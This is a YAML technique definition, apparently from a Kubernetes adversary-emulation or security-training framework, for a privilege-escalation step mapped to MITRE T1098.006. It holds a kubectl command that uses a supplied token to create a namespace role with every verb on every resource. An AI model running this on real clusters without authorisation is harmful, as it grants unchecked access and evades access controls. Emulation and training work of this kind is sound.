name: Create Admin Role
description: Create a highly privileged RBAC role and bind it to an existing service account
tactic: Privilege Escalation
techniques:
  - "Account Manipulation: Additional Container Cluster Roles"
  - T1098.006
parameters:
  ROLE_NAME:
    type: string
    default: nsadmin
    description: the name of the service account to which the role will be bound
  NAMESPACE:
    type: string
    default: ${NS}
    description: the name of the namespace in which the role will be created
  TOKEN:
    type: string
    default: ""
    description: the token used to authenticate to the API server
procedures:
  - key: kubectl
    # export TOKEN=${TOKEN}
    command: >
      kubectl create role ${ROLE_NAME} --verb=* --resource=* --token=${TOKEN} --namespace=${NAMESPACE}
preconditions:
  kind: ServiceAccount
  rbac: create role
parser: newRole
effects:
  - Role(${ROLE_NAME})
# cmd: {}
# defend: {}
refernces:
  - https://attack.mitre.org/techniques/T1098/006/
  - https://github.com/Container-Security-Training/Kubecon-EU-25
